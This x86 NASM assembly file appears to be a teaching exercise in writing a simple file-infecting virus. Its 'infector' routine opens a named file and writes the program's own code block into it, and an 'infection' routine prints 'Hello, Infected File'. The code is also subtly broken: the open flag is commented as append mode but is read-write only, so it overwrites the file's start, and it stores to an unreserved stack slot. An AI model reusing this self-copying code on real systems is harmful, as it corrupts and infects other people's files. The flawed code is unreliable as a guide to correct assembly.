section .data
    infected_message db 'Hello, Infected File', 0xA  ; message and newline character
    msg_len equ $ - infected_message  ; length of the message
    newline db 0xA
    
section .text
    global _start
    global system_call
    extern main
    global code_start
    global code_end
    global infection
    global infector

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        mov     eax, 4          ; system call number (sys_write)
        mov     ebx, 1          ; file descriptor (stdout)
        mov     ecx, infected_message  ; message to write
        mov     edx, msg_len    ; message length
        int     0x80            ; call kernel
        ret

    infector:
        ; infector function implementation
        push    ebp             ; Save caller state
        mov     ebp, esp
        ; sub     esp, 12         ; Leave space for local variables

        ; Calculate the length of the filename
        mov     eax, 0          ; Start with index 0
        mov     ecx, [ebp+8]    ; Pointer to the filename
        mov     edx, 0          ; Clear edx for length count

    count_length:
        cmp     byte [ecx+eax], 0  ; Check for null terminator
        je      print_filename  
        inc     edx             
        inc     eax             
        jmp     count_length    ; Repeat the loop

    print_filename:
        ; Print the file name
        mov     eax, 4          ; sys_write
        mov     ebx, 1          ; stdout
        int     0x80            ; syscall

        mov     eax, 4          ; sys_write
        mov     ebx, 1          ; stdout
        mov     ecx, newline    ; newline character to write
        mov     edx, 1          ; length of the character
        int     0x80            ; syscall

       ; Open the file for appending
        mov     eax, 5              ; sys_open
        mov     ebx, [ebp+8]        ; filename
        mov     ecx, 0x02           ; O_RDWR | O_APPEND
        int     0x80                ; syscall
        mov     dword [ebp-4], eax  ; save file descriptor

        ; Write the executable code to the file
        mov     eax, 4              ; sys_write
        mov     ebx, [ebp-4]        ; file descriptor
        mov     ecx, code_start     ; start address of code
        mov     edx, code_end - code_start ; length of the code
        int     0x80                ; syscall

        ; Close the file
        mov     eax, 6              ; sys_close
        mov     ebx, [ebp-4]        ; file descriptor
        int     0x80           

        ; Clean up and return
        ; add     esp, 12         ; Restore stack
        pop     ebp             ; Restore caller state
        ret    

code_end:
